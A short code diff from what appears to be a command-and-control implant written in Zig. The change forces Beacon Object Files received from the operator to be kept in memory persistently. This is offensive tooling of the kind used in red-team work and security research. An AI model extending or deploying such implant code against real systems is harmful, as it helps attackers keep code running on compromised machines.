@@ -400,7 +400,7 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *zbeac0n.State, task
     std.log.info("Received hash: 0x{x}", .{hash});
 
     // keep BOF in memory after running it?
-    const is_persistent = if (bof_header_iter.next()) |v| std.mem.eql(u8, v, "persist") else false;
+    var is_persistent = if (bof_header_iter.next()) |v| std.mem.eql(u8, v, "persist") else false;
     if(is_persistent)
         std.log.info("Persisted", .{});
 
@@ -524,6 +524,7 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *zbeac0n.State, task
 
         state.implant_actions.attachFunctionality(bof_to_exec);
 
+        is_persistent = true;
         try state.persistent_bofs.put(hash, bof_to_exec);
 
         // BOF contains go(...) function, so execute it
